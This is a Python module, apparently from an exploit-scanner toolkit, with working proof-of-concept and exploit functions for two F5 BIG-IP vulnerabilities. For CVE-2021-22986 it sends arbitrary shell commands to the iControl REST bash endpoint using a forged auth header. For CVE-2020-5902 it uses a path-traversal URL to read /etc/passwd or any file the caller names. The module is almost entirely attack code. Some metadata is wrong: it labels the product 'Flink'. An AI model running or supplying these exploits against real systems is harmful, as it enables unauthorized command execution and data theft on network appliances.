#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import json
import threading
from core.verify import verify
from core.verify import misinformation
from module import globals
from module.md5 import random_md5
from thirdparty import requests
from thirdparty.requests.compat import urljoin
from thirdparty.requests_toolbelt.utils import dump


class BIG_IP():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2021_22986_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "F5 BIG-IP: CVE-2021-22986"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "F5 BIG-IP Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2021-22986"
        self.vul_info["vul_apps"] = "Flink"
        self.vul_info["vul_date"] = "2021-03-11"
        self.vul_info["vul_vers"] = "< 16.0.1"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Remote Code Execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "BIG-IP存在代码执行漏洞，该漏洞允许定义身份验证的攻击者通过BIG-IP" \
                                    "管理界面和自身IP地址对iControl REST接口进行网络访问，以执行任意系统命令，" \
                                    "创建或删除文件以及替换服务。该中断只能通过控制界面利用，而不能通过数据界面利用。"
        self.vul_info["cre_date"] = "2021-03-20"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {
            'User-Agent': self.ua,
            'Accept': '*/*',
            'Connection': 'close',
            'Authorization': 'Basic YWRtaW46',
            'X-F5-Auth-Token': '',
            'Content-Type': 'application/json'
        }
        md = random_md5()
        cmd = "echo " + md
        data = r'''{"command": "run", "utilCmdArgs": "-c 'RECOMMAND'"}'''.replace("RECOMMAND", cmd)
        url = urljoin(self.url, "/mgmt/tm/util/bash")
        try:
            request = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            r = json.loads(request.text)["commandResult"]
            if request.status_code == 200:
                if md in misinformation(r, md):
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["vul_payd"] = data
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_22986_exp(self, cmd):
        vul_name = "F5 BIG-IP: CVE-2021-22986"
        headers = {
            'User-Agent': self.ua,
            'Accept': '*/*',
            'Connection': 'close',
            'Authorization': 'Basic YWRtaW46',
            'X-F5-Auth-Token': '',
            'Content-Type': 'application/json'
        }
        data = r'''{"command": "run", "utilCmdArgs": "-c 'RECOMMAND'"}'''.replace("RECOMMAND", cmd)
        url = urljoin(self.url, "/mgmt/tm/util/bash")
        try:
            request = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            r = json.loads(request.text)["commandResult"]
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(r, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)

    def cve_2020_5902_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "F5 BIG-IP: CVE-2020-5902"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "F5 BIG-IP Remote Code Execution"
        self.vul_info["vul_numb"] = "CVE-2020-5902"
        self.vul_info["vul_apps"] = "Flink"
        self.vul_info["vul_date"] = "2020-07-15"
        self.vul_info["vul_vers"] = "< 11.6.x"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "Remote Code Execution"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "The Traffic Management User Interface (TMUI), also referred to as the " \
                                    "Configuration utility, has a Remote Code Execution (RCE) vulnerability in " \
                                    "undisclosed pages. (CVE-2020-5902)"
        self.vul_info["cre_date"] = "2021-03-20"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=CVE-2020-5902")
        try:
            request = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
            if request.status_code == 200 and r"CVE-2020-5902" in request.text:
                url = self.url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
                request = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                if r"root:x:0:0:" in request.text and r"daemon:x:" in request.text and r"nologin" in request.text:
                    self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                    self.vul_info["vul_payd"] = url
                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
                    self.vul_info["prt_info"] = "[rce] [url:" + url + " ]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2020_5902_exp(self, cmd):
        vul_name  = "F5 BIG-IP: CVE-2020-5902"
        url = urljoin(self.url, "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=" + cmd)
        try:
            request = requests.get(url, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception as e:
            verify.error_print(vul_name)